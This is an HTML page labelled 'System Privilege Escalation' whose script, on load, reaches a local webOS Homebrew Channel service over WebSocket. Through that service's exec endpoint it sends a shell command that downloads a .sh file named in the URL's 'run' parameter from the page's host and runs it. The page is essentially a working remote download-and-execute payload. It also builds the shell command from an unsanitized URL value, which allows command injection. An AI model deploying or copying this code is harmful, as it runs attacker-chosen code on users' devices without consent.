<!DOCTYPE html>
<html>
<body style="background:#000; color:#00ff00; font-family:monospace; padding:20px;">
    <h2>System Privilege Escalation</h2>
    <div id="status">Initializing payload...</div>

    <script>
        const status = document.getElementById('status');
        const urlParams = new URLSearchParams(window.location.search);
        const scriptToRun = urlParams.get('run');
        const SITE_ROOT = window.location.origin;

        function trigger() {
            const ws = new WebSocket('ws://127.0.0.1:3000');
            ws.onopen = () => {
                // Command to download and run the specific .sh file
                const fullCmd = `curl -L ${SITE_ROOT}/${scriptToRun} -o /tmp/${scriptToRun} && sh /tmp/${scriptToRun}`;
                
                ws.send(JSON.stringify({
                    id: "exec", type: "request",
                    uri: "luna://org.webosbrew.hbchannel.service/exec",
                    payload: { command: fullCmd }
                }));
            };
            ws.onmessage = (e) => {
                status.innerText = "Payload sent: " + scriptToRun + ". Closing...";
                setTimeout(() => { ws.close(); window.close(); }, 2000);
            };
        }

        if (scriptToRun) { trigger(); } else { status.innerText = "No script specified."; }
    </script>
</body>
</html>
